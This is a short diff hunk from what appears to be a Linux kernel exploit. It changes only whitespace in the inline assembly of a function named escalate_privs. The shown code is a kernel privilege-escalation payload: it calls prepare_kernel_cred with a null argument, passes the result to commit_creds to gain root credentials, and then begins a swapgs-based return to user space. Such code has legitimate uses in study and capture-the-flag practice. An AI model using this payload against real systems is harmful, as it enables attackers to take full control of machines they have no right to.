@@ -104,9 +104,9 @@ void escalate_privs(void){
     __asm__(
         "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
         "xor rdi, rdi;"
-	    "call rax; mov rdi, rax;"
-	    "movabs rax, commit_creds;" //commit_creds
-	    "call rax;"
+        "call rax; mov rdi, rax;"
+        "movabs rax, commit_creds;" //commit_creds
+        "call rax;"
         "swapgs;"
         "mov r15, user_ss;"
         "push r15;"
